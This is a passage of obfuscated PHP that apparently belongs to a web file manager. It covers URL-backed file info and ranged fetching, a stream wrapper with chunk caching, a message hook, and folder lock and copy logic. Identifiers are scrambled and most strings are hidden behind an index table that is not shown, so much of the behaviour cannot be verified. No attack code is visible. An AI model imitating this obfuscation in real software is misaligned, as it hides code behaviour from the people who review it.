$Ş„ŞÊ£ = array_merge($‹è‹˜·İ, $©º¯îº); $ËÒ’¼¯Ù = Model($ÆŠØÌÍ[577])->userListInfo($Ş„ŞÊ£); foreach ($ñ‰àìâÓ as &$ØÔğ¦ùê) { $½†ÃÕ = $ØÔğ¦ùê[$ÆŠØÌÍ[504]]; $ØÔğ¦ùê[$ÆŠØÌÍ[504]] = $ËÒ’¼¯Ù[$½†ÃÕ] ? $ËÒ’¼¯Ù[$½†ÃÕ] : !1; $½†ÃÕ = $ØÔğ¦ùê[$ÆŠØÌÍ[506]]; $ØÔğ¦ùê[$ÆŠØÌÍ[506]] = $ËÒ’¼¯Ù[$½†ÃÕ] ? $ËÒ’¼¯Ù[$½†ÃÕ] : !1; if (isset($ØÔğ¦ùê[$ÆŠØÌÍ[516]]) && $ØÔğ¦ùê[$ÆŠØÌÍ[516]][$ÆŠØÌÍ[585]]) { $‚‚¦’Ò– = $GLOBALS[$ÆŠØÌÍ[6]][$ÆŠØÌÍ[89]][$ÆŠØÌÍ[586]]; if ($ØÔğ¦ùê[$ÆŠØÌÍ[516]][$ÆŠØÌÍ[587]] <= time() - $‚‚¦’Ò–) { $this->metaSet($ØÔğ¦ùê[$ÆŠØÌÍ[181]], $ÆŠØÌÍ[585], null); $this->metaSet($ØÔğ¦ùê[$ÆŠØÌÍ[181]], $ÆŠØÌÍ[587], null); unset($ØÔğ¦ùê[$ÆŠØÌÍ[516]][$ÆŠØÌÍ[585]]); continue; } $ÍÚ«»Ëå = $ØÔğ¦ùê[$ÆŠØÌÍ[516]][$ÆŠØÌÍ[585]]; $ØÔğ¦ùê[$ÆŠØÌÍ[516]][$ÆŠØÌÍ[588]] = Model($ÆŠØÌÍ[577])->getInfoSimpleOuter($ÍÚ«»Ëå); } } unset($ØÔğ¦ùê); } public function parentLevelArray($œØ‹ìô ) { $Áç©èõ =& $_SERVER[íû‘ş´]; $œØ‹ìô  = explode($Áç©èõ[50], trim($œØ‹ìô , $Áç©èõ[50])); return array_remove_value($œØ‹ìô , $Áç©èõ[212]); } public function listAll($ÁŞºÇ…Ñ) { $õ—ÛÉù± =& $_SERVER[íû‘ş´]; $¬¹¨‚¬ó = $this->sourceInfo($ÁŞºÇ…Ñ); $‚‰åÊ†Ü = array($õ—ÛÉù±[589] => array($õ—ÛÉù±[590], $¬¹¨‚¬ó[$õ—ÛÉù±[563]] . $ÁŞºÇ…Ñ . $õ—ÛÉù±[591]), $õ—ÛÉù±[592] => 0); $¼Ú¦Éñ÷ = $õ—ÛÉù±[593]; $ºÇ”ş´ú = "\x4c\x45\106\124\40\112\117\x49\x4e\x20{$this->tablePrefix}\151\x6f\x5f\x66\x69\x6c\x65\x20\x66\151\x6c\x65\40\157\x6e\40\163\x6f\x75\x72\x63\x65\56\146\151\154\145\111\104\40\x3d\x20\146\x69\x6c\145\x2e\x66\x69\x6c\145\x49\x44"; $¯‘ç¡½À = $this->alias($õ—ÛÉù±[496])->field($¼Ú¦Éñ÷)->where($‚‰åÊ†Ü)->join($ºÇ”ş´ú)->select(); $this->_listAppendAuth($¯‘ç¡½À); $this->_listAppendUser($¯‘ç¡½À); $this->_listAppendPath($¯‘ç¡½À); $¯‘ç¡½À = array_to_keyvalue($¯‘ç¡½À, $õ—ÛÉù±[181]); $ÔÀ™–©Î = "\57{$¬¹¨‚¬ó[$õ—ÛÉù±[32]]}\x2f"; $ÔÀ™–©Î = $ÔÀ™–©Î == $õ—ÛÉù±[571] ? $õ—ÛÉù±[8] : $ÔÀ™–©Î; $ğóãİšÄ = array(); foreach ($¯‘ç¡½À as $¤²ºğ»¯ => $Å–şÃ•) { $•éú¢ÓË = $this->parentLevelArray($Å–şÃ•[$õ—ÛÉù±[563]]); array_shift($•éú¢ÓË); $Ì¿ªõõÂ = $ÔÀ™–©Î; for ($Å¯Êå¡” = 0; $Å¯Êå¡” < count($•éú¢ÓË); $Å¯Êå¡”++) { $Ì¿ªõõÂ .= $¯‘ç¡½À[$•éú¢ÓË[$Å¯Êå¡”]][$õ—ÛÉù±[32]] . $õ—ÛÉù±[8]; } $Ì¿ªõõÂ .= $Å–şÃ•[$õ—ÛÉù±[32]]; if ($Å–şÃ•[$õ—ÛÉù±[462]]) { $Ì¿ªõõÂ .= $õ—ÛÉù±[8]; } $û´¦Æ®û = array($õ—ÛÉù±[472] => str_replace($õ—ÛÉù±[571], $õ—ÛÉù±[8], str_replace($õ—ÛÉù±[571], $õ—ÛÉù±[8], str_replace($õ—ÛÉù±[571], $õ—ÛÉù±[8], $Ì¿ªõõÂ))), $õ—ÛÉù±[594] => intval($Å–şÃ•[$õ—ÛÉù±[462]]), $õ—ÛÉù±[595] => intval($Å–şÃ•[$õ—ÛÉù±[76]]), $õ—ÛÉù±[85] => intval($Å–şÃ•[$õ—ÛÉù±[85]]), $õ—ÛÉù±[87] => $this->pathInfoFilter($Å–şÃ•)); if (!$û´¦Æ®û[$õ—ÛÉù±[462]]) { $û´¦Æ®û[$õ—ÛÉù±[518]] = $Å–şÃ•[$õ—ÛÉù±[518]]; } $ğóãİšÄ[] = $û´¦Æ®û; } $ğóãİšÄ = array_sort_by($ğóãİšÄ, $õ—ÛÉù±[84]); return $ğóãİšÄ; } } goto e™‡ãÀ·ßø; CŞ­ÔÙã®è: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($‘¼áÕÇ = false) { } public function exist($¤òŞ—) { $Â…Õ¢«É = $this->info($¤òŞ—); return $Â…Õ¢«É[$_SERVER[íû‘ş´][216]]; } public function isFile($€Ì¨šÃÑ) { $”¨‘Ê = $this->info($€Ì¨šÃÑ); return $”¨‘Ê[$_SERVER[íû‘ş´][216]]; } public function isFolder($§…ïÒË¼) { return !1; } public function size($‡ŞáÊÏ) { $ëóİ¹€¦ = $this->info($‡ŞáÊÏ); return $ëóİ¹€¦[$_SERVER[íû‘ş´][76]]; } public function info($õã€É†õ) { return $this->infoParse($õã€É†õ); } public function infoAuth($Šã°¿‹) { return $this->infoParse($Šã°¿‹); } public function infoWithChildren($Ïü°¶ŒÖ) { return $this->infoParse($Ïü°¶ŒÖ); } public function infoFull($Åƒ×³¾Å) { return $this->infoParse($Åƒ×³¾Å); } private function infoParse($õ€ÌÊßÓ) { $ÛªÔˆ½ã =& $_SERVER[íû‘ş´]; $ Àª°È = $this->header($õ€ÌÊßÓ); if (!$ Àª°È || !$ Àª°È[$ÛªÔˆ½ã[809]]) { return !1; } $âú¼æ¥ƒ = _get($ Àª°È, $ÛªÔˆ½ã[381], 0); $ÒÕ€Ö€“ = array($ÛªÔˆ½ã[32] => $ Àª°È[$ÛªÔˆ½ã[32]], $ÛªÔˆ½ã[84] => $õ€ÌÊßÓ, $ÛªÔˆ½ã[33] => $ÛªÔˆ½ã[214], $ÛªÔˆ½ã[76] => intval($âú¼æ¥ƒ), $ÛªÔˆ½ã[175] => get_path_ext($ Àª°È[$ÛªÔˆ½ã[32]]), $ÛªÔˆ½ã[1421] => $âú¼æ¥ƒ > 0 && $ Àª°È[$ÛªÔˆ½ã[1543]], $ÛªÔˆ½ã[1422] => !1); return $ÒÕ€Ö€“; } private function header($Ö††³±) { $¥íùœªˆ =& $_SERVER[íû‘ş´]; if (isset(self::$_cacheHeader[$Ö††³±])) { return self::$_cacheHeader[$Ö††³±]; } $÷æàÊëØ = isset($GLOBALS[$¥íùœªˆ[1544]]) ? $GLOBALS[$¥íùœªˆ[1544]] : !1; $GLOBALS[$¥íùœªˆ[1544]] = !0; self::$_cacheHeader[$Ö††³±] = url_header($Ö††³±); $GLOBALS[$¥íùœªˆ[1544]] = $÷æàÊëØ; return self::$_cacheHeader[$Ö††³±]; } public function hashSimple($µú¯óÚ÷, $•…óÛÑ´ = false) { $Ê€ˆÉ›× =& $_SERVER[íû‘ş´]; $õ²¾‡¼Ç = $this->info($µú¯óÚ÷); if (!$õ²¾‡¼Ç || !$õ²¾‡¼Ç[$Ê€ˆÉ›×[216]]) { return !1; } $½ò¼ÒÄØ = $õ²¾‡¼Ç[$Ê€ˆÉ›×[76]]; $º¹ªûÚ» = 200; $ëÆé§¾Ä = 50; if ($½ò¼ÒÄØ <= $º¹ªûÚ» * $ëÆé§¾Ä) { return md5($this->fileSubstr($µú¯óÚ÷, 0, $½ò¼ÒÄØ)) . $½ò¼ÒÄØ; } $çÉÜ— = intval($½ò¼ÒÄØ / $ëÆé§¾Ä); $”šãÜİŒ = $Ê€ˆÉ›×[12]; $Ê¬ÍĞËâ = timeFloat(); $á‰ôŸ»ß = 15; for ($÷æ¹ñ— = 0; $÷æ¹ñ— < $ëÆé§¾Ä; $÷æ¹ñ—++) { if (timeFloat() - $Ê¬ÍĞËâ > $á‰ôŸ»ß) { return !1; } $Õæû†Ì´ = $this->fileSubstr($µú¯óÚ÷, $çÉÜ— * $÷æ¹ñ—, $º¹ªûÚ»); if (!$Õæû†Ì´) { return !1; } $”šãÜİŒ .= $Õæû†Ì´; } $”šãÜİŒ .= $this->fileSubstr($µú¯óÚ÷, $½ò¼ÒÄØ - $º¹ªûÚ», $º¹ªûÚ»); return md5($”šãÜİŒ) . $½ò¼ÒÄØ; } public function getContent($´Ÿ£µ²) { return $this->fileSubstr($´Ÿ£µ²); } public function fileSubstr($È±à»š‡, $€²•æàï = 0, $ö³ò˜•Â = -1) { $ú™áãÆ¬ =& $_SERVER[íû‘ş´]; $ü¾›Àå§ = $this->info($È±à»š‡); if (!$ü¾›Àå§ || !$ü¾›Àå§[$ú™áãÆ¬[216]] && $ü¾›Àå§[$ú™áãÆ¬[76]] > 1024 * 1024 * 10) { return !1; } if ($ö³ò˜•Â === -1) { $ö³ò˜•Â = $ü¾›Àå§[$ú™áãÆ¬[76]]; } if ($ö³ò˜•Â == 0) { return $ú™áãÆ¬[12]; } $ïüßæ‘‚ = array($ú™áãÆ¬[1545] . $€²•æàï . $ú™áãÆ¬[841] . ($€²•æàï + $ö³ò˜•Â - 1)); $Ä„ºÛü‡ = url_request($È±à»š‡, $ú™áãÆ¬[245], !1, $ïüßæ‘‚, !1, !1, 30); return $Ä„ºÛü‡[$ú™áãÆ¬[1260]] ? $Ä„ºÛü‡[$ú™áãÆ¬[1260]] : $ú™áãÆ¬[12]; } public function download($º’ˆõˆ, $ºë›·ÚÓ) { Downloader::start($º’ˆõˆ, $ºë›·ÚÓ); return $ºë›·ÚÓ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($èç€¶°¾, $İÁ°ÚÅ¬ = '') { $this->info = $this->info($èç€¶°¾); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[íû‘ş´][84]]; $this->pathOpen = $èç€¶°¾; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$èç€¶°¾])) { self::$_chunkBuffer[$èç€¶°¾] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($äê˜¬Æƒ) { $Üè–ÈÌ = $this->fileSubstr($this->pose, $äê˜¬Æƒ); $this->pose += strlen($Üè–ÈÌ); return $Üè–ÈÌ; } public function stream_tell() { return $this->pose; } public function stream_seek($„Ë€†÷á, $õÃÀŸâÒ) { $—†˜¹•â =& $_SERVER[íû‘ş´]; if ($õÃÀŸâÒ == SEEK_SET) { $this->pose = $„Ë€†÷á; } else { if ($õÃÀŸâÒ == SEEK_CUR) { $this->pose += $„Ë€†÷á; } else { if ($õÃÀŸâÒ == SEEK_END) { $this->pose = $this->info[$—†˜¹•â[76]] + intval($„Ë€†÷á); } } } if ($„Ë€†÷á < 0) { $this->pose = $this->info[$—†˜¹•â[76]] + $„Ë€†÷á; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[íû‘ş´][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ß ¢Îº, $®ıŠ¦Ğø) { $¦æİÜş =& $_SERVER[íû‘ş´]; $‘Õ•£€Ó = $this->info($ß ¢Îº); return array($¦æİÜş[1546] => 0, $¦æİÜş[1547] => 0, $¦æİÜş[16] => 32768 + 511, $¦æİÜş[1548] => 0, $¦æİÜş[1549] => 0, $¦æİÜş[1550] => 0, $¦æİÜş[1551] => 0, $¦æİÜş[76] => $‘Õ•£€Ó[$¦æİÜş[76]], $¦æİÜş[1552] => $‘Õ•£€Ó[$¦æİÜş[1420]], $¦æİÜş[1508] => $‘Õ•£€Ó[$¦æİÜş[85]], $¦æİÜş[1507] => $‘Õ•£€Ó[$¦æİÜş[215]], $¦æİÜş[1553] => 0, $¦æİÜş[1554] => 0); } static $fileInfo = array(); public function info($„ºİÆì·) { $ÉÙêÎÄ = $_SERVER[íû‘ş´][1555]; if (isset(self::$fileInfo[$„ºİÆì·])) { return self::$fileInfo[$„ºİÆì·]; } if (substr($„ºİÆì·, 0, strlen($ÉÙêÎÄ)) != $ÉÙêÎÄ) { return !1; } self::$fileInfo[$„ºİÆì·] = IO::info(substr($„ºİÆì·, strlen($ÉÙêÎÄ))); return self::$fileInfo[$„ºİÆì·]; } public static function read($¾™„°ÖÔ, $í¯”ğ³¢, $ÌŒÛéÒ¸) { if (!isset(self::$_fopenCache[$¾™„°ÖÔ])) { $‘‰Ç˜ó» = new StreamWrapperIO(); $‘‰Ç˜ó»->stream_open($¾™„°ÖÔ); self::$_fopenCache[$¾™„°ÖÔ] = $‘‰Ç˜ó»; } $‘‰Ç˜ó» = self::$_fopenCache[$¾™„°ÖÔ]; return $‘‰Ç˜ó»->fileSubstr($í¯”ğ³¢, $ÌŒÛéÒ¸); } public static function _read($ê“äõ± , $öÖ‹™¶•, $³×±Øâ) { $À©ƒšÈí =& $_SERVER[íû‘ş´]; $†ñ™¿£ = fopen($ê“äõ± , $À©ƒšÈí[1424]); if (!$†ñ™¿£) { return $À©ƒšÈí[12]; } $ø±÷€ë¤ = 8192; fseek($†ñ™¿£, $öÖ‹™¶•, SEEK_SET); $†óüÏÉ® = $À©ƒšÈí[12]; $Í ³•¹ = 0; while ($Í ³•¹ < $³×±Øâ) { $úŸƒê“ = min($ø±÷€ë¤, $³×±Øâ - $Í ³•¹); $†óüÏÉ® .= fread($†ñ™¿£, $úŸƒê“); $Í ³•¹ += $úŸƒê“; } fclose($†ñ™¿£); return $†óüÏÉ®; } public function fileSubstr($ÔªÒÈà©, $ºç¥´½É) { $åòŸÓíë =& $_SERVER[íû‘ş´]; $ÚùãÕ† = $this->info[$åòŸÓíë[76]]; $Â®—¸ã = $ÔªÒÈà©; $ñ£ÛÄĞ¹ = $ºç¥´½É; if ($ÔªÒÈà© < 0) { $ÔªÒÈà© = $ÚùãÕ† + $ÔªÒÈà©; } if ($ºç¥´½É === !1) { $ºç¥´½É = $ÚùãÕ† - $ÔªÒÈà©; } if ($ÔªÒÈà© + $ºç¥´½É > $ÚùãÕ†) { $ºç¥´½É = $ÚùãÕ† - $ÔªÒÈà©; } if ($ºç¥´½É <= 0) { return $åòŸÓíë[12]; } if ($ÔªÒÈà© < 0 || $ÔªÒÈà© >= $ÚùãÕ† || $ºç¥´½É <= 0 || $ºç¥´½É > 1024 * 1024 * 10) { throw new Exception("\151\157\x46\151\x6c\x65\x52\x65\x61\x64\x20\145\162\162\157\162\x21\x20\x73\164\141\x72\164\x3d{$ÔªÒÈà©}\73\x6c\145\x6e\147\164\150\75{$ºç¥´½É}\73\x20\x73\x69\172\x65\75{$ÚùãÕ†}\x3b"); } $ŒšÔ®°ì = 64 * 1024; $óÊ·êò× =& self::$_chunkBuffer[$this->path]; if (!$óÊ·êò×) { $óÊ·êò× = array(); } $ÕÃ¹¥¹ = 0; $ƒç¥»· = 0; $ˆÊÖ¼µø = $åòŸÓíë[12]; foreach ($óÊ·êò× as $ÕÃ¹¥¹ => $ˆÊÖ¼µø) { $ÕÃ¹¥¹ = intval($ÕÃ¹¥¹); $ƒç¥»· = $ÕÃ¹¥¹ + strlen($ˆÊÖ¼µø); if ($ÔªÒÈà© >= $ƒç¥»·) { continue; } if ($ÔªÒÈà© >= $ÕÃ¹¥¹ && $ÔªÒÈà© + $ºç¥´½É <= $ƒç¥»·) { return substr($ˆÊÖ¼µø, $ÔªÒÈà© - $ÕÃ¹¥¹, $ºç¥´½É); } break; } if (count($óÊ·êò×) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($åòŸÓíë[1556], $åòŸÓíë[1557] . count($óÊ·êò×) . "\73\x73\x74\141\162\x74\75{$ÔªÒÈà©}\x2c\x6c\145\156\x67\x74\x68\75{$ºç¥´½É}\x3b\x70\x6f\163\145\x3a{$ÕÃ¹¥¹}\176{$ƒç¥»·}"); throw new Exception($åòŸÓíë[1558]); } $ğå™‘÷ú = intval($ÔªÒÈà© / $ŒšÔ®°ì) * $ŒšÔ®°ì; $°ÈİÓ†å = ceil(($ÔªÒÈà© + $ºç¥´½É) / $ŒšÔ®°ì) * $ŒšÔ®°ì - $ğå™‘÷ú; $“áì„÷ = IO::fileSubstr($this->path, $ğå™‘÷ú, $°ÈİÓ†å); $óÊ·êò×[$ğå™‘÷ú . $åòŸÓíë[12]] = $“áì„÷; ksort($óÊ·êò×); $ıœÃ²ç = substr($“áì„÷, $ÔªÒÈà© - $ğå™‘÷ú, $ºç¥´½É); return $ıœÃ²ç; } private function log($¿ÄÔÕ„ß, $‚«Ò´…à) { $óË¿šˆ =& $_SERVER[íû‘ş´]; $×ˆ‚ë·± = timeFloat() - $this->timeStart; write_log(sprintf($óË¿šˆ[1559], $¿ÄÔÕ„ß, $this->info[$óË¿šˆ[32]], $×ˆ‚ë·±, $‚«Ò´…à), $óË¿šˆ[1240]); } } class Message { function __construct() { } public function send($‡àŠÎ®Ş = '', $åş¹ˆ‘ = array(), $£’œç¿£ = "\164\x65\x78\164") { $ëË¬´ò =& $_SERVER[íû‘ş´]; $›Âº×†ƒ = array($ëË¬´ò[33] => $ëË¬´ò[1560], $ëË¬´ò[813] => $‡àŠÎ®Ş); if (in_array($£’œç¿£, array($ëË¬´ò[1560], $ëË¬´ò[1561]))) { $›Âº×†ƒ[$ëË¬´ò[33]] = $£’œç¿£; } $åş¹ˆ‘ = array($ëË¬´ò[557] => isset($åş¹ˆ‘[$ëË¬´ò[557]]) ? $åş¹ˆ‘[$ëË¬´ò[557]] : $ëË¬´ò[12], $ëË¬´ò[640] => isset($åş¹ˆ‘[$ëË¬´ò[640]]) ? $åş¹ˆ‘[$ëË¬´ò[640]] : $ëË¬´ò[12]); if (empty($‡àŠÎ®Ş) || empty($åş¹ˆ‘[$ëË¬´ò[557]]) && empty($åş¹ˆ‘[$ëË¬´ò[640]])) { return !1; } $äÆ¶‰Šù = array($ëË¬´ò[1501] => $›Âº×†ƒ, $ëË¬´ò[1562] => $åş¹ˆ‘); Hook::trigger($ëË¬´ò[1563], $äÆ¶‰Šù); } } goto Eô´›„­óœ; e™‡ãÀ·ßø: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($¹¡­–Ö) { $­Š¯Çò¿ =& $_SERVER[íû‘ş´]; if (!$this->allowLock()) { return; } $this->_lockCheck($­Š¯Çò¿[596], $¹¡­–Ö); $ÍËè•“— = 1; $this->_lockEvent($¹¡­–Ö, array($­Š¯Çò¿[597], $­Š¯Çò¿[598]), $ÍËè•“—); $this->_lockParent($¹¡­–Ö, array($­Š¯Çò¿[598]), $ÍËè•“—); $this->_lockEvent($¹¡­–Ö, array($­Š¯Çò¿[599], $­Š¯Çò¿[600]), $ÍËè•“—); $this->_lockCheckEnd($­Š¯Çò¿[596], $¹¡­–Ö); } public function lockCopyEnd($©ÓÇÅ³Ï) { $ê©İ¼şê =& $_SERVER[íû‘ş´]; if (!$this->allowLock()) { return; } $‚•èüé = 0; $this->_lockEvent($©ÓÇÅ³Ï, array($ê©İ¼şê[597], $ê©İ¼şê[598]), $‚•èüé); $this->_lockParent($©ÓÇÅ³Ï, array($ê©İ¼şê[598]), $‚•èüé); $this->_lockEvent($©ÓÇÅ³Ï, array($ê©İ¼şê[599], $ê©İ¼şê[600]), $‚•èüé); } public function lockWriteStart($«¶‡ƒ©­, $ß½úªöû = '') { $ó±Ş³ =& $_SERVER[íû‘ş´]; if (!$this->allowLock()) { return; } $this->_lockCheck($ó±Ş³[597], $«¶‡ƒ©­); $§õµƒ×õ = 1; $this->_lockKey($ó±Ş³[601] . $«¶‡ƒ©­ . $ó±Ş³[10] . $ß½úªöû, $§õµƒ×õ); $this->_lockEvent($«¶‡ƒ©­, array($ó±Ş³[596], $ó±Ş³[598]), $§õµƒ×õ); $this->_lockParent($«¶‡ƒ©­, array($ó±Ş³[596], $ó±Ş³[598]), $§õµƒ×õ); $this->_lockCheckEnd($ó±Ş³[597], $«¶‡ƒ©­); } public function lockWriteEnd($ïÍªš¯, $Æõ¢©™¿ = '') { $Œæ©¿’š =& $_SERVER[íû‘ş´]; if (!$this->allowLock()) { return; } $·Šı†¯ = 0; $this->_lockKey($Œæ©¿’š[601] . $ïÍªš¯ . $Œæ©¿’š[10] . $Æõ¢©™¿, $·Šı†¯); $this->_lockEvent($ïÍªš¯, array($Œæ©¿’š[596], $Œæ©¿’š[598]), $·Šı†¯); $this->_lockParent($ïÍªš¯, array($Œæ©¿’š[596], $Œæ©¿’š[598]), $·Šı†¯); } public function lockMoveStart($¼¶«œª) { $ß¶‘Óå =& $_SERVER[íû‘ş´]; if (!$this->allowLock()) { return; } $this->_lockCheck($ß¶‘Óå[598], $¼¶«œª); $ÌÄ”Ô¦ß = 1; $this->_lockKey($ß¶‘Óå[602] . $¼¶«œª, $ÌÄ”Ô¦ß); $this->_lockEvent($¼¶«œª, array($ß¶‘Óå[596], $ß¶‘Óå[597]), $ÌÄ”Ô¦ß); $this->_lockParent($¼¶«œª, array($ß¶‘Óå[596], $ß¶‘Óå[598]), $ÌÄ”Ô¦ß); $this->_lockEvent($¼¶«œª, array($ß¶‘Óå[603], $ß¶‘Óå[599], $ß¶‘Óå[600]), $ÌÄ”Ô¦ß); $this->_lockCheckEnd($ß¶‘Óå[598], $¼¶«œª); } public function lockMoveEnd($¯æÆšÉ) { $‰¥Á”ÉÔ =& $_SERVER[íû‘ş´]; if (!$this->allowLock()) { return; } $ˆ•Ù ´ø = 0; $this->_lockKey($‰¥Á”ÉÔ[602] . $¯æÆšÉ, $ˆ•Ù ´ø); $this->_lockEvent($¯æÆšÉ, array($‰¥Á”ÉÔ[596], $‰¥Á”ÉÔ[597]), $ˆ•Ù ´ø); $this->_lockParent($¯æÆšÉ, array($‰¥Á”ÉÔ[596], $‰¥Á”ÉÔ[598]), $ˆ•Ù ´ø); $this->_lockEvent($¯æÆšÉ, array($‰¥Á”ÉÔ[603], $‰¥Á”ÉÔ[599], $‰¥Á”ÉÔ[600]), $ˆ•Ù ´ø); } private function _lockCheck($¾…¸†í±, $Å”•àá) { $ôÇ­é°À =& $_SERVER[íû‘ş´]; $Ê×Ã½ô = $this->sourceInfo($Å”•àá); $¨ÄÔÂà = $¾…¸†í± . $ôÇ­é°À[10] . $Å”•àá; $this->_lockTimeStart[$¨ÄÔÂà] = timeFloat(); if (!is_array($Ê×Ã½ô)) { return; } $äÊ«Úœ™ = LNG($ôÇ­é°À[604]); CacheLock::setErrorMsg($ôÇ­é°À[163] . htmlspecialchars($Ê×Ã½ô[$ôÇ­é°À[32]]) . $ôÇ­é°À[165] . $äÊ«Úœ™); $this->_lockKey($¨ÄÔÂà, 1); $this->_lockKey($¨ÄÔÂà, 0); $®£›€•‚ = array_reverse($this->parentLevelArray($Ê×Ã½ô[$ôÇ­é°À[563]])); foreach ($®£›€•‚ as $äìÖ¤Ù) { $¨ÄÔÂà = $¾…¸†í± . $ôÇ­é°À[605] . $äìÖ¤Ù; if (CacheLock::lockGet($ôÇ­é°À[606] . $¨ÄÔÂà)) { $Ê×Ã½ô = $this->sourceInfo($äìÖ¤Ù); CacheLock::setErrorMsg($ôÇ­é°À[163] . htmlspecialchars($Ê×Ã½ô[$ôÇ­é°À[32]]) . $ôÇ­é°À[165] . $äÊ«Úœ™); $this->_lockKey($¨ÄÔÂà, 1); $this->_lockKey($¨ÄÔÂà, 0); } } } private function _lockCheckEnd($ˆÑŸşú•, $öîŸî¾) { $æ€Ù­ =& $_SERVER[íû‘ş´]; $æÓ‡¸Ê = $ˆÑŸşú• . $æ€Ù­[10] . $öîŸî¾; CacheLock::setErrorMsg($æ€Ù­[422]); if (!isset($this->_lockTimeStart[$æÓ‡¸Ê])) { return; } $”¥È…†î = timeFloat() - $this->_lockTimeStart[$æÓ‡¸Ê]; unset($this->_lockTimeStart[$æÓ‡¸Ê]); if ($”¥È…†î > 0.5) { unset(self::$cacheSourceInfo[$æ€Ù­[510] . $öîŸî¾]); } $šÎÆ¦Ÿ = $this->sourceInfo($öîŸî¾); if (!$šÎÆ¦Ÿ) { show_json(LNG($æ€Ù­[105]), !1); } } private function _lockParent($©ëĞÀí¦, $óÙ§øĞú, $¨‘ôÓ¹å) { if (!$this->autoLockSet) { return; } $»Øˆã¡ = $this->sourceInfo($©ëĞÀí¦); if (!is_array($»Øˆã¡)) { return; } $ÉıáÙ¯Ğ = array_reverse($this->parentLevelArray($»Øˆã¡[$_SERVER[íû‘ş´][563]])); foreach ($ÉıáÙ¯Ğ as $°ãŞ”) { $this->_lockEvent($°ãŞ”, $óÙ§øĞú, $¨‘ôÓ¹å); } } private function _lockEvent($·‘ıÍÉé, $ˆ‡» Ü‚, $Ú–Ş£…İ) { $ÂÉô¼âı =& $_SERVER[íû‘ş´]; if (!$this->autoLockSet) { return; } foreach ($ˆ‡» Ü‚ as $¢¨ûáÁ) { $´¶Å² = $¢¨ûáÁ . $ÂÉô¼âı[10] . $·‘ıÍÉé; if ($Ú–Ş£…İ && CacheLock::lockGet($ÂÉô¼âı[606] . $´¶Å²)) { continue; } $this->_lockKey($´¶Å², $Ú–Ş£…İ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ÚÈíÓè, $ÍŠàå½ = 1) { $¬ŸÇ¬×» = $_SERVER[íû‘ş´][606] . md5($ÚÈíÓè); if ($ÍŠàå½) { if (isset(self::$_lockItemArr[$¬ŸÇ¬×»])) { return; } self::$_lockItemArr[$¬ŸÇ¬×»] = 1; CacheLock::lock($¬ŸÇ¬×», $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$¬ŸÇ¬×»])) { return; } unset(self::$_lockItemArr[$¬ŸÇ¬×»]); CacheLock::unlock($¬ŸÇ¬×»); } } public function isParentOf($ãêĞ½¥, $²¢²ìéÀ) { $³à“ó³× =& $_SERVER[íû‘ş´]; $²ô¦¾±ë = $this->sourceInfo($ãêĞ½¥); $¬Åîš•¢ = $this->sourceInfo($²¢²ìéÀ); $àŠç˜„ï = $²ô¦¾±ë[$³à“ó³×[563]] . $²ô¦¾±ë[$³à“ó³×[181]] . $³à“ó³×[50]; $˜Ÿüº¾Õ = $¬Åîš•¢[$³à“ó³×[563]] . $¬Åîš•¢[$³à“ó³×[181]] . $³à“ó³×[50]; $˜““—„ö = strpos($˜Ÿüº¾Õ, $àŠç˜„ï) === 0; return $˜““—„ö; } private $targetIsDelete = 0; public function copy($ğêŞø€¹, $ğÄÅõÂ¾, $¤³õ¹›¿ = REPEAT_REPLACE, $©”ùÁª = '') { $Éåˆ›¿ =& $_SERVER[íû‘ş´]; $ö‹ÊÌ®  = $this->sourceInfo($ğêŞø€¹); $£¯ïØ‰¨ = $this->sourceInfo($ğÄÅõÂ¾); if (!$ö‹ÊÌ®  || !$£¯ïØ‰¨ || $£¯ïØ‰¨[$Éåˆ›¿[462]] != $Éåˆ›¿[88]) { return !1; } if ($this->isParentOf($ğêŞø€¹, $ğÄÅõÂ¾)) { return !1; } $Ï‚–Ş¨˜ = $©”ùÁª ? $©”ùÁª : $ö‹ÊÌ® [$Éåˆ›¿[32]]; $this->lockCopyStart($ğêŞø€¹); $this->lockWriteStart($ğÄÅõÂ¾, $Ï‚–Ş¨˜); $†Ü‡¿‡ = array($Éåˆ›¿[607] => array(), $Éåˆ›¿[608] => array(), $Éåˆ›¿[609] => array()); $this->targetIsDelete = intval($ö‹ÊÌ® [$Éåˆ›¿[482]]); $‹ Ëşë = $this->fileNameExistAuto($ğÄÅõÂ¾, $ö‹ÊÌ® ); $ÑíúÈ—Ä = $this->_copy($ğêŞø€¹, $ğÄÅõÂ¾, $¤³õ¹›¿, $†Ü‡¿‡, !0, $©”ùÁª); $this->_childrenListClear(); $this->lockCopyEnd($ğêŞø€¹); $this->lockWriteEnd($ğÄÅõÂ¾, $Ï‚–Ş¨˜); if ($ö‹ÊÌ® [$Éåˆ›¿[462]] == $Éåˆ›¿[88] && $‹ Ëşë == $ÑíúÈ—Ä) { $this->folderSizeResetChildren($‹ Ëşë); } Model($Éåˆ›¿[610])->addAll($†Ü‡¿‡[$Éåˆ›¿[608]], array(), !0); if ($‹ Ëşë != $ÑíúÈ—Ä || $ö‹ÊÌ® [$Éåˆ›¿[462]] == $Éåˆ›¿[88]) { Model($Éåˆ›¿[611])->eventCopy($ÑíúÈ—Ä); } $this->saveAll($†Ü‡¿‡[$Éåˆ›¿[609]]); Model($Éåˆ›¿[214])->linkAdd($†Ü‡¿‡[$Éåˆ›¿[607]]); $this->folderSizeReset($ğÄÅõÂ¾); $this->updateModifyTime($ğÄÅõÂ¾); return $ÑíúÈ—Ä; } private function _copy($”§©•éß, $ÀÄ„°ÇÚ, $†ş»™Ò©, &$É·¨ü‹š, $Ü©³ÂĞ©, $ÌÛ¨—ó† = '') { $œ¾é áï =& 